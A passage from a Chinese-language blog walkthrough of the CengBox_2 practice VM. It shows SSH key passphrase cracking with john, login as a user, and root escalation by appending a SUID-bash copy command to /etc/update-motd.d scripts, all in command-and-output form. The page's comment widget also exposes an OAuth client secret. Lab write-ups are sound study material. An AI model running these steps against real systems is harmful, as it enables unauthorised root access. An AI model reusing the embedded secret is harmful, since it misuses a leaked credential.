+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CengBox2]<br>└─$ ssh2john id_rsa &gt; sshhash<br><br>┌──(kali㉿kali)-[~/Documents/CengBox2]<br>└─$ sudo john sshhash --wordlist=/usr/share/wordlists/rockyou.txt <br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])<br>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 2 (iteration count) is 1 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>legend           (id_rsa)     <br>1g 0:00:00:00 DONE (2023-10-17 01:03) 100.0g/s 195200p/s 195200c/s 195200C/s amore..mandy<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed.<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CengBox2]<br>└─$ ssh -i id_rsa mitnick@192.168.1.103     <br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;id_rsa&#x27;</span>: <br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>166 packages can be updated.<br>119 updates are security updates.<br><br>Last login: Mon Oct 16 22:03:42 2023 from 192.168.1.101<br>To run a <span class="hljs-built_in">command</span> as administrator (user <span class="hljs-string">&quot;root&quot;</span>), use <span class="hljs-string">&quot;sudo &lt;command&gt;&quot;</span>.<br>See <span class="hljs-string">&quot;man sudo_root&quot;</span> <span class="hljs-keyword">for</span> details.<br>mitnick@cengbox:~$ <span class="hljs-built_in">ls</span> -alih<br>total 48K<br>414532 drwxr-x--- 4 mitnick developers 4.0K May 25  2020 .<br>390272 drwxr-xr-x 4 root    root       4.0K May 23  2020 ..<br>407565 -rw------- 1 mitnick mitnick      40 Oct 16 22:04 .bash_history<br>402634 -rw-r--r-- 1 mitnick mitnick     220 May 23  2020 .bash_logout<br>402595 -rw-r--r-- 1 mitnick mitnick    3.7K May 23  2020 .bashrc<br>414533 drwx------ 2 mitnick mitnick    4.0K May 23  2020 .cache<br>407529 -rw------- 1 mitnick mitnick     505 May 23  2020 .mysql_history<br>407543 -rw------- 1 mitnick mitnick       1 May 26  2020 .php_history<br>390954 -rw-r--r-- 1 mitnick mitnick     655 May 23  2020 .profile<br>403733 drwxr-x--- 2 mitnick developers 4.0K May 25  2020 .ssh<br>391963 -rw------- 1 mitnick mitnick      33 May 23  2020 user.txt<br>407544 -rw------- 1 mitnick mitnick       1 May 26  2020 .viminfo<br>mitnick@cengbox:~$ <span class="hljs-built_in">cat</span> user.txt<br>a10333b0b7c3f914e8c446fd8e9cd362<br></code></pre></td></tr></table></figure>
+
+<p>历史文件简单查看后没发现什么有价值的信息</p>
+<p>SUID、定时任务文件、passwd 和 shadow 文件权限查看后没发现可利用的点。</p>
+<h2 id="MOTD-提权"><a href="#MOTD-提权" class="headerlink" title="MOTD 提权"></a>MOTD 提权</h2><p>linpeas 来信息收集一下</p>
+<p><img src="/pic/f1a31992ffaffe860a0ee414be65ade4_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>或许可以利用，翻一翻常用的提权手法，发现了 MOTD 提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mitnick@cengbox:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/bash /tmp/bash &amp;&amp; chmod u+s /tmp/bash&quot;</span> &gt;&gt; /etc/update-motd.d/00-header<br></code></pre></td></tr></table></figure>
+
+<p>然后 exit&#x2F;logout 先退出再重新登录 ssh</p>
+<p>不过写在这个文件里似乎没反应，换个文件写试试（记得 cat 查看一下确保写进去了）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mitnick@cengbox:/etc/update-motd.d$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/bash /tmp/bash &amp;&amp; chmod u+s /tmp/bash&quot;</span> &gt;&gt; /etc/update-motd.d/10-help-text<br></code></pre></td></tr></table></figure>
+
+<p>重新登录后，成功。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">mitnick@cengbox:~$ <span class="hljs-built_in">ls</span> -liha /tmp<br>total 4.9M<br>   133 drwxrwxrwt 10 root    root        4.0K Oct 16 22:46 .<br>     2 drwxr-xr-x 23 root    root        4.0K May 23  2020 ..<br> 15013 -rwsr-xr-x  1 root    root       1014K Oct 16 22:46 bash<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">mitnick@cengbox:~$ /tmp/bash -p<br>bash-4.3<span class="hljs-comment"># cd /root</span><br>bash-4.3<span class="hljs-comment"># ls -liah</span><br>total 36K<br>   15 drwx------  3 root root 4.0K May 26  2020 .<br>    2 drwxr-xr-x 23 root root 4.0K May 23  2020 ..<br>15009 -rw-------  1 root root    0 May 26  2020 .bash_history<br>   16 -rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc<br>16298 drwxr-xr-x  2 root root 4.0K May 23  2020 .nano<br>15008 -rw-------  1 root root    1 May 26  2020 .php_history<br>   17 -rw-r--r--  1 root root  148 Aug 17  2015 .profile<br>15012 -rw-r--r--  1 root root  518 May 23  2020 root.txt<br>14996 -rw-r--r--  1 root root   66 May 23  2020 .selected_editor<br>15011 -rw-------  1 root root    1 May 26  2020 .viminfo<br>bash-4.3<span class="hljs-comment"># cat root.txt</span><br>  _____ ______             ____            ___  <br> / ____|  ____|           |  _ \          |__ \ <br>| |    | |__   _ __   __ _| |_) | _____  __  ) |<br>| |    |  __| | <span class="hljs-string">&#x27;_ \ / _` |  _ &lt; / _ \ \/ / / / </span><br><span class="hljs-string">| |____| |____| | | | (_| | |_) | (_) &gt;  &lt; / /_ </span><br><span class="hljs-string"> \_____|______|_| |_|\__, |____/ \___/_/\_\____|</span><br><span class="hljs-string">                      __/ |                     </span><br><span class="hljs-string">                     |___/                      </span><br><span class="hljs-string"></span><br><span class="hljs-string">I would be grateful for your any feedback. Feel free to contact me on Twitter @arslanblcn_</span><br><span class="hljs-string"></span><br><span class="hljs-string">de89782fe4e8bf2198a022ae7f50613e</span><br></code></pre></td></tr></table></figure>
+
+<p>最后来个定妆照</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.3<span class="hljs-comment"># whoami</span><br>root<br>bash-4.3<span class="hljs-comment"># id</span><br>uid=1000(mitnick) gid=1002(developers) euid=0(root) <span class="hljs-built_in">groups</span>=1002(developers),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare)<br>bash-4.3<span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:a4:96:c9 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.1.103/24 brd 192.168.1.255 scope global enp0s3<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fea4:96c9/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>3: lxdbr0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 4e:77:e0:ff:98:b7 brd ff:ff:ff:ff:ff:ff<br>    inet6 fe80::4c77:e0ff:feff:98b7/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::1/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>bash-4.3<span class="hljs-comment"># uname -a</span><br>Linux cengbox 4.4.0-142-generic <span class="hljs-comment">#168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CengBox_2 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/10/be5fd2fbc403.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月17日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/67e28830d268.html" title="CryptoBank_1靶机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CryptoBank_1靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/1ef2ffe7f741.html" title="CengBox_1 靶机">
+                        <span class="hidden-mobile">CengBox_1 靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: 'a10c4d83b52b56ecdbb91a57d022d920'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
